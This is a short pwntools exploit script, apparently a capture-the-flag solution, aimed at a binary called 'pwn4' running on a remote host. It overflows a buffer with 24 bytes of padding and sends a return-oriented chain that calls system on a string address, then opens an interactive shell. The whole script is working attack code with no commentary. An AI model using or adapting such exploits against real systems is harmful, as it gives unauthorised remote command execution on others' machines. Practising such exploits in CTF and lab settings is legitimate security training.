from pwn import *
context.log_level='debug'
#io=process('./pwn4')
io=remote('114.116.54.89','10004')
elf=ELF('./pwn4')
io.recv()
sleep(2)
pop_edi_retn=0x4007d3
payload='A'*24+p64(pop_edi_retn)+p64(0x60111f)+p64(elf.symbols['system'])
io.send(payload)
io.recvuntil('fail\n')
sleep(2)
io.interactive()
